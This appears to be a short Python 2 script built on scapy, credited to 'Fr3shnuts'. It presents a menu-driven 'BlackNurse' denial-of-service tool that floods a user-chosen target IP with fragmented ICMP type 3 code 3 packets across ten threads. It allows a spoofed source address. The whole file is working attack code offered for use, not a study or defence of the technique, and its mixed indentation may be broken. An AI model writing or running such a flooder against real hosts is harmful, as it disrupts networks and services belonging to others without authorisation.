from scapy.all import *
import sys
import time
from threading import Thread,current_thread

def menu():
    print '\n## Created by Fr3shnuts'
    time.sleep(1)
    print """
###############################################################################
 _     _            _                                     _           
 | |__ | | __ _  ___| | ___ __  _   _ _ __ ___  ___     __| | ___  ___ 
 | '_ \| |/ _` |/ __| |/ / '_ \| | | | '__/ __|/ _ \   / _` |/ _ \/ __|
 | |_) | | (_| | (__|   <| | | | |_| | |  \__ \  __/  | (_| | (_) \__ \\
 |_.__/|_|\__,_|\___|_|\_\_| |_|\__,_|_|  |___/\___|___\__,_|\___/|___/
                                                  |_____|


 Menu
 ----

 1. blacknurse attack
 2. quit

###############################################################################
"""

while 1:
    menu()
    userInput = raw_input('Enter #: ')

# blacknurse attack
    if userInput == '1':
        print '\nblacknurse Attack Initiated'
        print '---------------------------'

        target = raw_input('\nTarget      IP: ')
        source = raw_input('\nSource      IP: ')
	
	def blacknurse(i):
	    a = 0
            while a < 10:
                a = a + 1
	        ping = send(fragment(IP(dst=target,src=source)/ICMP(type=3,code=3)/('blacknurse')),inter=0.001,verbose=0)
                print "Loop Count per Thread : %s" % a
		print current_thread()
	        time.sleep(1)
# Threading: sends 10 ping packets per 1 while loop, total 100 by end of while
        for i in range(10):
            t = Thread(target=blacknurse, args=(i,))
            t.start()
	if True:
	    t.join()
    elif userInput == "2":
	print "Exiting"
	sys.exit()
    else:
	sys.exit("Error")
